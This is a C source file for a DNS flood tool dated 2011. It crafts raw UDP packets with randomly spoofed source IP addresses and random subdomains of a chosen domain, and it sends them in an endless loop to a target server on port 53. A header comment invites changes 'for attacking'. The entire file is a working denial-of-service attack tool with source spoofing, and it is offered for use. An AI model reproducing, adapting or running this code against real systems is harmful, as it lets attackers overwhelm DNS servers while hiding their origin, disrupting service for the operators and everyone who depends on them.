// code by yunshu(wustyunshu@hotmail.com, 2011-07-11. just for test, have fun.
// you should change some codes for attacking.
 
#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <pthread.h>
#include <errno.h>
 
typedef struct ip_hdr
{
    unsigned char     h_verlen;
    unsigned char     tos;
    unsigned short    total_len;
    unsigned short    ident;
    unsigned short    frag_and_flags;
    unsigned char     ttl;
    unsigned char     proto;
    unsigned short    checksum;
    unsigned int      sourceIP;
    unsigned int      destIP;
}IP_HEADER;
 
typedef struct udp_hdr
{
    unsigned short    uh_sport;
    unsigned short    uh_dport;
    unsigned short    uh_length;
    unsigned short    uh_checksum;
}UDP_HEADER;
 
typedef struct usd_hdr
{
    unsigned long       saddr;
    unsigned long       daddr;
    char                mbz;
    char                ptcl;
    unsigned short      udpl;
}USD_HEADER; 
 
typedef struct dns
{
    unsigned short    tid;
    unsigned short    flags;
    unsigned short    queries;
    unsigned short    answers;
    unsigned short    auth;
    unsigned short    additional;
}DNS_HEADER;
 
typedef struct query
{
    char *    name;
    unsigned short    type;
    unsigned short    class;
}QUERY_HEADER;
 
int const HOST_LENGTH = 3;
unsigned long long sleeptime, starttime, outcount = 0;
int pkt_then_sleep = 0;
 
unsigned short CheckSum(unsigned short * buffer, int size)
{
    unsigned long   cksum = 0;

    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size)
    {
        cksum += *(unsigned char *) buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);

    return (unsigned short) (~cksum);
}
 
void MySleep(unsigned int micro_second)
{
    struct timeval  t_timeval;

    t_timeval.tv_sec = 0;
    t_timeval.tv_usec = micro_second;

    select( 0, NULL, NULL, NULL, &t_timeval );
}
 
void PaddingQuery( char *buffer, char *base_name )
{
    char *tmp = (char *)malloc(strlen(base_name)+HOST_LENGTH+1);
    if( NULL == tmp )
    {
        fprintf( stderr, "malloc for query error: %s\n", strerror(errno) );
        exit -1;
    }
    memset( tmp, 0, strlen(base_name)+HOST_LENGTH+1 );
    sprintf( tmp, "%c%c%c%s", rand()%25+97, rand()%25+97, rand()%25+97, base_name );
 
    int length_pos = 0;
    int loop_num = 1;
 
    char *token = strtok( tmp, "." );
    while( NULL != token )
    {
        if( loop_num == 1 )
        {
            length_pos = 0;
            memset( buffer, strlen(token), 1 );
            strcpy( buffer+length_pos+1, token );
 
            length_pos = length_pos + strlen(token) + 1;
        }
        else
        {
            memset( buffer+length_pos, strlen(token), 1 );
            strcpy( buffer+length_pos+1, token );
 
            length_pos = length_pos + strlen(token) + 1;
        }
 
        token = strtok( NULL, "." );
        loop_num ++;
    }
    free(tmp);
}
 
void Init( char *buffer, int buffer_size, char *ip, char *base_name )
{
    IP_HEADER   IpHeader;
    UDP_HEADER  UdpHeader;
    USD_HEADER  UsdHeader;
    DNS_HEADER  DnsHeader;
    QUERY_HEADER    QueryHeader;
 
    // whole udp packet except ip header and usd_header
    int total_packet_len = buffer_size;
 
    // udp packet with usd_header
    int udp_with_usd_len = total_packet_len - sizeof(IP_HEADER) + sizeof(USD_HEADER);
 
    char *udp_packet = (char *)malloc( udp_with_usd_len );
    if( NULL == udp_packet )
    {
        fprintf( stderr, "malloc udp packet error: %s\n", strerror(errno) );
        exit;
    }
    memset( udp_packet, 0, udp_with_usd_len );
 
    IpHeader.h_verlen = (4<<4 | sizeof(IpHeader)/sizeof(unsigned int));
    IpHeader.tos = 0;
    IpHeader.total_len = htons( total_packet_len );
    IpHeader.ident = rand() % 30000 + 9876;
    IpHeader.frag_and_flags = 0x0000;
    IpHeader.ttl = 255;
    IpHeader.proto = IPPROTO_UDP;
    IpHeader.checksum = 0x0000;
    // 1.1.1.1 ----------- 250.250.250.250
    IpHeader.sourceIP = htonl(rand( ) % 4193909242 + 16843009);
    //IpHeader.sourceIP = inet_addr("10.23.230.110");
    IpHeader.destIP = inet_addr(ip);
 
    UdpHeader.uh_sport = htons( rand() % 8000 + 2345 );
    UdpHeader.uh_dport = htons(53);
    UdpHeader.uh_length = htons( total_packet_len - sizeof(IP_HEADER) );
    UdpHeader.uh_checksum = 0x0000;
 
    UsdHeader.saddr = IpHeader.sourceIP;
    UsdHeader.daddr = IpHeader.destIP;
    UsdHeader.mbz = 0x00;
    UsdHeader.ptcl = IPPROTO_UDP;
    UsdHeader.udpl = UdpHeader.uh_length;
 
    DnsHeader.tid = rand() % 40000 + 12345;
    DnsHeader.flags = 0x0001;
    DnsHeader.queries = 0x0100;
    DnsHeader.answers = 0x0000;
    DnsHeader.auth = 0x0000;
    DnsHeader.additional = 0x0000;
 
    QueryHeader.type = 0x0100;
    QueryHeader.class = 0x0100;
 
    memcpy( (void*)buffer, (void*)&IpHeader, sizeof(IpHeader) );
    IpHeader.checksum = CheckSum( (unsigned short *) buffer, sizeof(IpHeader) );
    memcpy( (void*)buffer, (void*)&IpHeader, sizeof(IpHeader) );
 
    memcpy( udp_packet, (void*)&UsdHeader, sizeof(UsdHeader) );
 
    memcpy( udp_packet+sizeof(UsdHeader), &UdpHeader, sizeof(UdpHeader) );
 
    memcpy( udp_packet+sizeof(UsdHeader)+sizeof(UdpHeader), &DnsHeader, sizeof(DnsHeader) );
 
    PaddingQuery( udp_packet+sizeof(UsdHeader)+sizeof(UdpHeader)+sizeof(DnsHeader), base_name );
 
    memcpy( udp_packet+sizeof(UsdHeader)+sizeof(UdpHeader)+sizeof(DnsHeader)+1+HOST_LENGTH+strlen(base_name)+1, ((char*)&QueryHeader)+sizeof(char *), sizeof(QueryHeader)-sizeof(char*) );
 
    UdpHeader.uh_checksum = CheckSum( (unsigned short *)udp_packet, udp_with_usd_len ); 
    memcpy( udp_packet+sizeof(UsdHeader), &UdpHeader, sizeof(UdpHeader) );
 
    memcpy( buffer+sizeof(IpHeader), udp_packet+sizeof(UsdHeader), udp_with_usd_len - sizeof(USD_HEADER) );
 
    free( udp_packet );
}
 
void Flood( char *dst_ip, char *base_name )
{
    int sock;
    int flag = 1;
 
    // sizeof(char *) means the length of "name" field in the query header.
    // 2 means, 0x00 and the length of host, 0x03www0x06google0x03com0x00, fuck dns protocol
    int total_packet_len = sizeof(IP_HEADER) + sizeof(UDP_HEADER) + sizeof(DNS_HEADER) + sizeof(QUERY_HEADER) + strlen(base_name) + HOST_LENGTH + 2 - sizeof(char *);
 
    char *buffer = (char *)malloc( total_packet_len );
    if( NULL == buffer )
    {
        fprintf( stderr, "malloc memory for packet error.\n" );
        return;
    }
 
    struct sockaddr_in  sa;
    memset( &sa, 0, sizeof(struct sockaddr_in) );
    sa.sin_family = AF_INET;
    sa.sin_port = htons(53);
    sa.sin_addr.s_addr = inet_addr(dst_ip);
 
    if( (sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP))  < 0 )
    {
        fprintf( stderr, "create socket error: %s\n", strerror(errno) );
        free(buffer);
        return;
    }
 
    if( setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (int *)&flag, sizeof(flag)) < 0 )
    {
        fprintf( stderr, "setsockopt error: %s\n", strerror(errno) );
        free(buffer);
        return;
    }
 
    int number = 0;
    if( sleeptime == 0 )
    {
        while( 1 )
        {
            memset( (void *)buffer, 0, sizeof(buffer) );
            Init( buffer, total_packet_len, dst_ip, base_name );
 
            sendto( sock, buffer, total_packet_len, 0, (struct sockaddr *)&sa, sizeof(struct sockaddr_in) );
            outcount ++;
        }
    }
 
    else
    {
        while( 1 )
        {
            memset( (void*)buffer, 0, sizeof buffer );
            Init( buffer, total_packet_len, dst_ip, base_name );
 
            sendto( sock, buffer, total_packet_len, 0, (struct sockaddr *)&sa, sizeof(struct sockaddr_in) ); 
            outcount ++;
            number ++;
 
            if( number == pkt_then_sleep )
            {
                MySleep( sleeptime );
                number = 0;
            }
        }
    }
 
    free( buffer );
    return;
}
 
void sig_proc(int signum)
{
    int end_time = 0;
 
    end_time=time(NULL);

    printf("\n -- statistics( %d ) -----------------------\n", signum);
    printf("   packets sent:          %d\n",outcount);
    printf("   seconds active:        %d\n",end_time - starttime);
    printf("   average packet/second: %d\n",outcount/(end_time - starttime));
    printf(" -------------------------------------\n");

    exit(1);
}
 
void set_sig( )
{
    signal(SIGHUP,&sig_proc);
    signal(SIGINT,&sig_proc);
    signal(SIGQUIT,&sig_proc);
    signal(SIGILL,&sig_proc);
    signal(SIGABRT,&sig_proc);
    signal(SIGFPE,&sig_proc);
    signal(SIGSEGV,&sig_proc);
    signal(SIGPIPE,&sig_proc);
    signal(SIGALRM,&sig_proc);
    signal(SIGTERM,&sig_proc);
    signal(SIGUSR1,&sig_proc);
    signal(SIGUSR2,&sig_proc);
    signal(SIGCHLD,&sig_proc);
    signal(SIGCONT,&sig_proc);
    signal(SIGTSTP,&sig_proc);
    signal(SIGTTIN,&sig_proc);
    signal(SIGTTOU,&sig_proc);
}
 
int main(int argc,char *argv[])
{
    char    dst_ip[20] = { 0 };
    char    base_name[65] = { 0 };
 
    if( argc != 5 )
    {
        fprintf(stderr,"\n%s <target ip> <base_name> <pkt_then_sleep> <sleep_time>\n", argv[0]);
        fprintf(stderr, "send dns query to <target ip>, sleep <sleep_time> microseconds per <pkt_then_sleep> paskets.\nplease set base_name like '.baidu.com'\n\n");
        return -1;
    }
 
    strncpy( dst_ip, argv[1], 16 );
    strncpy( base_name,  argv[2], 64 );
 
    if( inet_addr(dst_ip) == INADDR_NONE )
    {      
        printf( "target ip error.\n" );
        return -1;
    }
 
    pkt_then_sleep = atoi(argv[3]);
    if( pkt_then_sleep == 0 )
    {
        printf( "pkt_then_sleep error.\n" );
        return -1;
    }
 
    sleeptime = atoi(argv[4]);
 
    starttime = time(NULL);
    while(time(NULL) == starttime) usleep(1000);
 
    srand((unsigned) time(NULL));
 
    set_sig( );
    Flood( dst_ip, base_name );
 
    return 0;
}
